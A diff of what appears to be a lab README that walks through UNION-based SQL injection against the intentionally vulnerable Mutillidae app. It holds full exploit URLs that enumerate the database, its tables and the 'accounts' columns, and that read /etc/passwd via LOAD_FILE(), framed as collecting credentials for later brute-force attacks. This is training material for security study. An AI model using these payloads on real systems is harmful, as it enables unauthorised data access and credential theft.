@@ -72,22 +72,17 @@ Now we will substitute some few commands like database(), user(), version() to o
 http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
 ![325660765-8d2cf032-acc3-43f8-925d-f32ed0bf113e](https://github.com/pradeepasri26/sqlinjection/assets/131433142/43360278-c4d0-4c0a-ad5f-4d57108381bc)
 The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.
-
 Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’
 
 http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
 
 ![325660845-bda602fd-6721-4d3c-8a06-1997773608d3](https://github.com/pradeepasri26/sqlinjection/assets/131433142/70faccc5-468e-4ea6-8124-fda9ceace43a)
 The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords
-
 When the attacker knows table names, he needs to discover what the column names are to extract data.
-
 In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”
-
 Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).
 
 Here we are trying to extract column names from the “accounts” table.
-
 ![325660962-7e2d45fc-92cf-4973-a51a-4ad7b6132d07](https://github.com/pradeepasri26/sqlinjection/assets/131433142/6decfa12-727f-4450-b3dd-1f379b8c7b3b)
 The column names of the accounts is displayed below for the following url:
 
@@ -105,7 +100,6 @@ http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27un
 We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.
 
 Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
-
 http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
 ![325661369-ce52fb71-a979-4e73-93fc-64c9a2678cd9](https://github.com/pradeepasri26/sqlinjection/assets/131433142/f6ac4e0c-3bd2-4331-9c17-ed2df2c37732)
 
